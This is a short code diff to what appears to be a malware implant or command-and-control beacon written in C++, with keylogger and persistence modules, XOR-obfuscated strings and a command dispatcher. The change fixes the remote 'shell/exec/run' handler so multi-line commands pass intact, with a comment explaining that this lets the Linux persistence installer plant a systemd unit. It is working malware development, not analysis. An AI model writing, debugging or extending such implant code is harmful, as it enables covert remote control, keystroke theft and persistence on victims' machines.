@@ -65,6 +65,7 @@
 #include "keylogger.h"
 #include "persistence.h"
 #include "task_lifecycle.h"
+#include "command_line.h"
 
 #include "screenshot.h"
 #include "media_utils.h"
@@ -1343,8 +1344,15 @@ std::string dispatch_command(const std::string& cmd, net::C2Config& cfg) {
         return XOR_DEC(XOR_STR("Usage: keylog <start|stop|status|dump [process]>")).c_str();
     }
     else if (action == XOR_DEC(XOR_STR("shell")).c_str() || action == XOR_DEC(XOR_STR("exec")).c_str() || action == XOR_DEC(XOR_STR("run")).c_str()) {
-        std::string shell_cmd;
-        std::getline(iss >> std::ws, shell_cmd);
+        // Everything after the verb, INCLUDING embedded newlines. The OS-shell
+        // verb is the only free-form command channel, and a multi-line command
+        // is legitimate: the Linux persistence builder carries a systemd unit
+        // with real newlines inside single quotes. std::getline stopped at the
+        // first one, so sh -c received an unterminated quote and every Linux
+        // persistence install died with "Syntax error: Unterminated quoted
+        // string" while the operator saw only "no findings". See
+        // command_line.h and tests/test_beacon_command_line.cpp.
+        std::string shell_cmd = command_line::argument_rest(cmd);
         if (shell_cmd.empty()) return XOR_DEC(XOR_STR("Usage: shell <command>")).c_str();
         return run_shell_command(shell_cmd);
     }
